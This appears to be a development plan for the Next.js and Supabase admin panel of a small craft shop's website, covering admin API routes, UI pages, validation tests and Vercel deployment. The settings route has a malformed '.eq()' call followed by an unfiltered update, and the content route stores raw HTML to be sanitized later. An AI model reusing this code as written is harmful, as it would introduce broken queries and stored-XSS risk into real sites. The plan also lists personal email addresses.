- [ ] **Step 1: Create `app/api/admin/content/route.ts`**
```typescript
import { NextResponse } from 'next/server'
import { createServiceRoleClient } from '@/lib/supabase/server'
import { requireAdminSession } from '@/lib/auth'
import { sanitizeText } from '@/lib/sanitize'

export async function POST(request: Request) {
  const { session, error } = await requireAdminSession()
  if (error) return error

  const body = await request.json().catch(() => ({}))
  const key = sanitizeText(body.key ?? '')
  const value = body.value ?? '' // Store raw value; sanitized on render

  if (!key) return NextResponse.json({ error: 'key required' }, { status: 400 })

  const supabase = createServiceRoleClient()
  await supabase.from('content').update({ value, updated_at: new Date().toISOString() }).eq('key', key)

  return NextResponse.json({ success: true })
}
```

- [ ] **Step 2: Create `app/api/admin/events/route.ts`**

```typescript
import { NextResponse } from 'next/server'
import { createServiceRoleClient } from '@/lib/supabase/server'
import { requireAdminSession } from '@/lib/auth'
import { isValidHttpsUrl, clampLength } from '@/lib/validate'
import { sanitizeText } from '@/lib/sanitize'

export async function GET() {
  const { error } = await requireAdminSession()
  if (error) return error
  const supabase = createServiceRoleClient()
  const { data } = await supabase.from('events').select('*').order('date')
  return NextResponse.json(data ?? [])
}

export async function POST(request: Request) {
  const { error } = await requireAdminSession()
  if (error) return error
  const body = await request.json().catch(() => ({}))
  const name = sanitizeText(clampLength(body.name ?? '', 200))
  const location = sanitizeText(clampLength(body.location ?? '', 300))
  const date = sanitizeText(body.date ?? '')
  if (!name) return NextResponse.json({ error: 'name required' }, { status: 400 })
  if (!location) return NextResponse.json({ error: 'location required' }, { status: 400 })
  if (!/^\d{4}-\d{2}-\d{2}$/.test(date)) return NextResponse.json({ error: 'date must be YYYY-MM-DD' }, { status: 400 })
  const link_url = body.link_url ? (isValidHttpsUrl(body.link_url) ? body.link_url : null) : null
  const supabase = createServiceRoleClient()
  const { data, error: dbError } = await supabase.from('events').insert({
    name, location, date,
    time: sanitizeText(clampLength(body.time ?? '', 50)) || null,
    description: sanitizeText(clampLength(body.description ?? '', 1000)) || null,
    link_url,
    link_label: link_url ? sanitizeText(clampLength(body.link_label ?? '', 100)) || 'Learn more' : null,
  }).select().single()
  if (dbError) return NextResponse.json({ error: 'Failed to create event' }, { status: 500 })
  return NextResponse.json(data, { status: 201 })
}

export async function PUT(request: Request) {
  const { error } = await requireAdminSession()
  if (error) return error
  const body = await request.json().catch(() => ({}))
  const { id, ...fields } = body
  if (!id) return NextResponse.json({ error: 'id required' }, { status: 400 })
  const update: Record<string, string | null> = {}
  if (fields.name !== undefined) update.name = sanitizeText(clampLength(fields.name, 200))
  if (fields.location !== undefined) update.location = sanitizeText(clampLength(fields.location, 300))
  if (fields.date !== undefined) {
    if (!/^\d{4}-\d{2}-\d{2}$/.test(fields.date)) return NextResponse.json({ error: 'date must be YYYY-MM-DD' }, { status: 400 })
    update.date = fields.date
  }
  if (fields.time !== undefined) update.time = sanitizeText(clampLength(fields.time, 50)) || null
  if (fields.description !== undefined) update.description = sanitizeText(clampLength(fields.description, 1000)) || null
  if (fields.link_url !== undefined) update.link_url = fields.link_url ? (isValidHttpsUrl(fields.link_url) ? fields.link_url : null) : null
  if (fields.link_label !== undefined) update.link_label = sanitizeText(clampLength(fields.link_label, 100)) || null
  const supabase = createServiceRoleClient()
  const { error: dbError } = await supabase.from('events').update(update).eq('id', id)
  if (dbError) return NextResponse.json({ error: 'Failed to update event' }, { status: 500 })
  return NextResponse.json({ success: true })
}

export async function DELETE(request: Request) {
  const { error } = await requireAdminSession()
  if (error) return error
  const body = await request.json().catch(() => ({}))
  if (!body.id) return NextResponse.json({ error: 'id required' }, { status: 400 })
  const supabase = createServiceRoleClient()
  await supabase.from('events').delete().eq('id', body.id)
  return NextResponse.json({ success: true })
}
```

- [ ] **Step 3: Create `app/api/admin/settings/route.ts`**

```typescript
import { NextResponse } from 'next/server'
import { createServiceRoleClient } from '@/lib/supabase/server'
import { requireAdminSession } from '@/lib/auth'
import { isValidHttpsUrl, isValidEmail } from '@/lib/validate'
import { sanitizeText } from '@/lib/sanitize'

const ALLOWED_THEMES = ['warm-artisan', 'soft-botanical'] as const

export async function POST(request: Request) {
  const { error } = await requireAdminSession()
  if (error) return error
  const body = await request.json().catch(() => ({}))
  const update: Record<string, string | boolean | null> = {}

  if (body.theme !== undefined) {
    if (!ALLOWED_THEMES.includes(body.theme)) return NextResponse.json({ error: 'Invalid theme' }, { status: 400 })
    update.theme = body.theme
  }
  // URL fields — only store validated https URLs
  for (const field of ['logo_url', 'square_store_url', 'announcement_link_url'] as const) {
    if (body[field] !== undefined) update[field] = body[field] ? (isValidHttpsUrl(body[field]) ? body[field] : null) : null
  }
  if (body.contact_email !== undefined) update.contact_email = isValidEmail(body.contact_email) ? body.contact_email : null
  if (body.announcement_enabled !== undefined) update.announcement_enabled = Boolean(body.announcement_enabled)
  if (body.announcement_text !== undefined) update.announcement_text = sanitizeText(body.announcement_text ?? '').slice(0, 300) || null
  if (body.announcement_link_label !== undefined) update.announcement_link_label = sanitizeText(body.announcement_link_label ?? '').slice(0, 100) || null
  // Social handles (stored as handle only, not full URL — validated at render)
  for (const field of ['social_instagram', 'social_tiktok', 'social_pinterest', 'social_x'] as const) {
    if (body[field] !== undefined) update[field] = sanitizeText(body[field] ?? '').slice(0, 100) || null
  }
  // social_facebook stored as full URL
  if (body.social_facebook !== undefined) update.social_facebook = body.social_facebook ? (isValidHttpsUrl(body.social_facebook) ? body.social_facebook : null) : null
  if (body.behold_widget_id !== undefined) update.behold_widget_id = sanitizeText(body.behold_widget_id ?? '').slice(0, 100) || null
  if (body.mailchimp_api_key !== undefined) update.mailchimp_api_key = sanitizeText(body.mailchimp_api_key ?? '') || null
  if (body.mailchimp_audience_id !== undefined) update.mailchimp_audience_id = sanitizeText(body.mailchimp_audience_id ?? '') || null

  update.updated_at = new Date().toISOString()
  const supabase = createServiceRoleClient()
  const { error: dbError } = await supabase.from('settings').update(update).eq('id', supabase.from('settings').select('id'))
  // Use simpler update-all since settings has only one row
  await supabase.from('settings').update(update)
  return NextResponse.json({ success: true })
}
```

- [ ] **Step 4: Create `app/api/admin/gallery/route.ts`**

```typescript
import { NextResponse } from 'next/server'
import { createServiceRoleClient } from '@/lib/supabase/server'
import { requireAdminSession } from '@/lib/auth'
import { isValidHttpsUrl, clampLength } from '@/lib/validate'
import { sanitizeText } from '@/lib/sanitize'

export async function POST(request: Request) {
  const { error } = await requireAdminSession()
  if (error) return error
  const body = await request.json().catch(() => ({}))
  const url = body.url ?? ''
  const alt_text = sanitizeText(clampLength(body.alt_text ?? '', 500))
  if (!isValidHttpsUrl(url)) return NextResponse.json({ error: 'Valid https image URL required' }, { status: 400 })
  if (!alt_text) return NextResponse.json({ error: 'Alt text required for accessibility' }, { status: 400 })
  const supabase = createServiceRoleClient()
  const { data } = await supabase.from('gallery').insert({
    url,
    alt_text,
    category: body.category ?? null,
    sort_order: Number(body.sort_order) || 0,
  }).select().single()
  return NextResponse.json(data, { status: 201 })
}

export async function DELETE(request: Request) {
  const { error } = await requireAdminSession()
  if (error) return error
  const body = await request.json().catch(() => ({}))
  if (!body.id) return NextResponse.json({ error: 'id required' }, { status: 400 })
  const supabase = createServiceRoleClient()
  await supabase.from('gallery').delete().eq('id', body.id)
  return NextResponse.json({ success: true })
}
```

- [ ] **Step 5: Write tests for admin API validation**

Create `__tests__/api/admin-validation.test.ts`:
```typescript
import { isValidHttpsUrl, isValidEmail, clampLength } from '@/lib/validate'

describe('Admin API input validation', () => {
  it('rejects javascript: links in event link_url', () => {
    expect(isValidHttpsUrl('javascript:void(0)')).toBe(false)
  })
  it('accepts valid https event link', () => {
    expect(isValidHttpsUrl('https://eventbrite.com/event/123')).toBe(true)
  })
  it('clamps alt text to 500 chars', () => {
    const long = 'a'.repeat(600)
    expect(clampLength(long, 500).length).toBe(500)
  })
})
```

```bash
npm test -- --testPathPattern=admin-validation
```
Expected: PASS

- [ ] **Step 6: Commit**
```bash
git add app/api/admin/ __tests__/api/admin-validation.test.ts
git commit -m "feat: admin API routes with auth verification and input validation"
```

---

### Task 11: Admin pages — Content, Events, Gallery, Branding, Integrations

**Files:**
- Create: `app/admin/content/page.tsx`
- Create: `app/admin/events/page.tsx`
- Create: `app/admin/gallery/page.tsx`
- Create: `components/admin/ImageUploader.tsx`
- Create: `app/admin/branding/page.tsx`
- Create: `app/admin/integrations/page.tsx`

- [ ] **Step 1: Create `components/admin/ImageUploader.tsx`**

Validates MIME type (must be `image/*`) and file size (≤ 5MB) before uploading. Requires alt text — upload button disabled until alt text is entered. On upload, calls Supabase Storage, then `POST /api/admin/gallery` with URL + alt text.

```typescript
const MAX_SIZE = 5 * 1024 * 1024 // 5MB
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp', 'image/gif']

function validateFile(file: File): string | null {
  if (!ALLOWED_TYPES.includes(file.type)) return 'Only JPEG, PNG, WebP, and GIF images are allowed.'
  if (file.size > MAX_SIZE) return 'Image must be under 5MB.'
  return null
}
```

- [ ] **Step 2: Write test for image validation**

Create `__tests__/components/admin/ImageUploader.test.ts`:
```typescript
// Test the validation logic inline (extracted for testability)
const MAX_SIZE = 5 * 1024 * 1024
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp', 'image/gif']

function validateFile(file: { type: string; size: number }): string | null {
  if (!ALLOWED_TYPES.includes(file.type)) return 'Only JPEG, PNG, WebP, and GIF images are allowed.'
  if (file.size > MAX_SIZE) return 'Image must be under 5MB.'
  return null
}

describe('Image upload validation', () => {
  it('rejects non-image files', () => {
    expect(validateFile({ type: 'application/pdf', size: 100 })).not.toBeNull()
  })
  it('rejects oversized files', () => {
    expect(validateFile({ type: 'image/jpeg', size: 6 * 1024 * 1024 })).not.toBeNull()
  })
  it('accepts valid small image', () => {
    expect(validateFile({ type: 'image/jpeg', size: 1 * 1024 * 1024 })).toBeNull()
  })
})
```

```bash
npm test -- --testPathPattern=ImageUploader
```
Expected: PASS

- [ ] **Step 3: Write test → run FAIL → implement `app/admin/content/page.tsx` → run PASS**

Test (`__tests__/components/admin/ContentPage.test.tsx`): renders a textarea for each content key, Save button per field, shows "Saved ✓" text after successful fetch.

Implement: Server component fetches all content rows via `getAllContent()`. For each key renders a `ContentEditor` client sub-component (inline client component) with a labeled `<textarea>` and Save button. Fields and row counts:
- `hero_tagline` (label: "Hero Tagline", rows: 2)
- `hero_subtext` (label: "Hero Subtext", rows: 3)
- `story_teaser` (label: "Story Teaser", rows: 4)
- `story_full` (label: "Full Story (HTML)", rows: 12)
- `privacy_policy` (label: "Privacy Policy (HTML)", rows: 20)
- `terms_of_service` (label: "Terms of Service (HTML)", rows: 20)

Each Save button posts `{ key, value }` to `POST /api/admin/content`. On success, shows inline "Saved ✓" with `aria-live="polite"`.

```bash
npm test -- --testPathPattern=ContentPage
```

- [ ] **Step 4: Write test → run FAIL → implement `app/admin/events/page.tsx` → run PASS**

Test (`__tests__/components/admin/EventsPage.test.tsx`): renders a list of events, "+ Add New Event" button expands form, form has required name/date/location fields, submitting calls `POST /api/admin/events`.

Implement: Server component fetches events via `createServiceRoleClient().from('events').select('*').order('date')`. Renders event list (name, formatted date, location), Edit and Delete buttons per row (Delete shows `ConfirmDialog`). "+ Add New Event" button expands an inline form. Form fields: name* (text), date* (type="date"), time (text), location* (text), description (textarea, 4 rows), link_url (text, validated before save), link_label (text).

```bash
npm test -- --testPathPattern=EventsPage
```

- [ ] **Step 5: Write test → run FAIL → implement `app/admin/gallery/page.tsx` → run PASS**

Test (`__tests__/components/admin/GalleryPage.test.tsx`): renders ImageUploader, renders photo grid, each photo has a delete button with accessible label.

Implement: Server component fetches gallery items via `createServiceRoleClient().from('gallery').select('*').order('sort_order')`. Renders `<ImageUploader>` at top. Photo grid: each item shows thumbnail (`<Image>`), alt text label, × delete button (shows `ConfirmDialog`), and sort up/down buttons.

```bash
npm test -- --testPathPattern=GalleryPage
```

- [ ] **Step 6: Write test → run FAIL → implement `app/admin/branding/page.tsx` → run PASS**

Test (`__tests__/components/admin/BrandingPage.test.tsx`): renders two theme option cards, each has a button/role that saves theme, announcement toggle is a checkbox with label.

Implement: Three sections:
1. **Theme** — two clickable cards with color swatches (Warm Artisan: `#2d1b4e`/`#d4a853`; Soft Botanical: `#f0e8f5`/`#9b7bb8`). Active theme shows "✓ Active". Clicking saves `theme` via `POST /api/admin/settings`.
2. **Logo** — `<ImageUploader>` that saves `logo_url` to settings after upload.
3. **Announcement banner** — `<input type="checkbox">` labeled "Show announcement banner", text field (max 300 chars), optional link URL + label. Save button posts to `POST /api/admin/settings`.

```bash
npm test -- --testPathPattern=BrandingPage
```

- [ ] **Step 7: Write test → run FAIL → implement `app/admin/integrations/page.tsx` → run PASS**

Test (`__tests__/components/admin/IntegrationsPage.test.tsx`): renders Square URL input, Behold widget ID input, social link inputs for each platform, Mailchimp key inputs, AI provider section shows "Coming in Phase 2" label.

Implement: Sections with "Save" buttons per group. Each section posts relevant fields to `POST /api/admin/settings`:
1. **Square** — `square_store_url` text input
2. **Instagram embed** — `behold_widget_id` text input + "Set up Behold.so →" link
3. **Social links** — Instagram handle, Facebook URL, TikTok handle, Pinterest handle, X handle
4. **Contact email** — `contact_email` input (email type)
5. **Newsletter** — `mailchimp_api_key` + `mailchimp_audience_id` inputs
6. **AI Provider** — disabled radio group (Claude/OpenAI/Groq) with label "Coming in Phase 2"

```bash
npm test -- --testPathPattern=IntegrationsPage
```

- [ ] **Step 8: Run all tests**
```bash
npm test
```
Expected: All PASS

- [ ] **Step 9: Commit**
```bash
git add app/admin/ components/admin/ __tests__/components/admin/
git commit -m "feat: complete admin panel — content, events, gallery, branding, integrations"
```

---

## Phase 6: Deploy to Vercel

### Task 12: Deployment and post-launch setup

- [ ] **Step 1: Push to GitHub**
```bash
git push origin main
```

- [ ] **Step 2: Connect to Vercel**
- vercel.com → New Project → Import `y3llojama/purple-acorns-creations`
- Framework preset: Next.js (auto-detected)
- Click Deploy

- [ ] **Step 3: Set environment variables in Vercel dashboard**
Under Project Settings → Environment Variables:
```
NEXT_PUBLIC_SUPABASE_URL      = (from Supabase)
NEXT_PUBLIC_SUPABASE_ANON_KEY = (from Supabase)
SUPABASE_SERVICE_ROLE_KEY     = (from Supabase — server only)
ADMIN_EMAILS                  = purpleacornzcreations@gmail.com,write2spica@gmail.com
```

- [ ] **Step 4: Add Vercel deployment URL to Supabase OAuth**

Supabase → Auth → URL Configuration → add:
```
https://your-vercel-domain.vercel.app/api/auth/callback
```

- [ ] **Step 5: Pre-register admin users in Supabase**
- Auth → Users → "Invite user" → `purpleacornzcreations@gmail.com`
- Auth → Users → "Invite user" → `write2spica@gmail.com`
- Auth → Settings → Disable "Allow new users to sign up"

- [ ] **Step 6: Set up Behold.so (one-time)**
- Create account at behold.so
- Connect @purpleacornz Instagram account
- Copy widget ID
- Log into `/admin/integrations` → paste widget ID → Save

- [ ] **Step 7: Seed initial content via admin panel**
- `/admin/branding` — choose theme, upload logo, set announcement
- `/admin/integrations` — Square URL, social links, Mailchimp keys
- `/admin/events` — add first upcoming event
- `/admin/content` — review and edit all copy

- [ ] **Step 8: Smoke test checklist**
```
[ ] Homepage loads with correct theme
[ ] All sections render (hero, story, featured, gallery, events, Instagram, newsletter)
[ ] /shop shows Square embed or placeholder
[ ] /our-story renders story with no raw HTML visible
[ ] /privacy and /terms load default legal content
[ ] /admin/login shows Sign in with Google
[ ] Authorized Google account (purpleacornzcreations@gmail.com) reaches /admin
[ ] Unauthorized Google account shows error and stays on login page
[ ] Announcement banner appears when enabled; dismiss button works
[ ] Newsletter form submits, returns success state
[ ] All admin sections save and show "Saved ✓"
[ ] Delete actions show confirmation dialog
[ ] Tab through page — focus rings visible on all interactive elements
[ ] Skip-to-content link appears on tab, skips to main
[ ] Mobile: homepage, shop, admin all usable at 375px width
[ ] Run Chrome Lighthouse → Accessibility score ≥ 90
[ ] No console errors in browser DevTools
```

- [ ] **Step 9: Final commit**
```bash
git add .
git commit -m "feat: deploy Purple Acorns Creations core website to Vercel"
git push origin main
```

---

## What's Next

Plan 2 (`2026-03-17-ai-smart-features-plan.md`) adds:
- AI content generation (`/api/ai/generate`, "✨ Generate" buttons)
- Newsletter compose + 3 templates + send via Mailchimp (`/admin/newsletter`)
- Reports dashboard with AI narrative digest (`/admin/reports`)
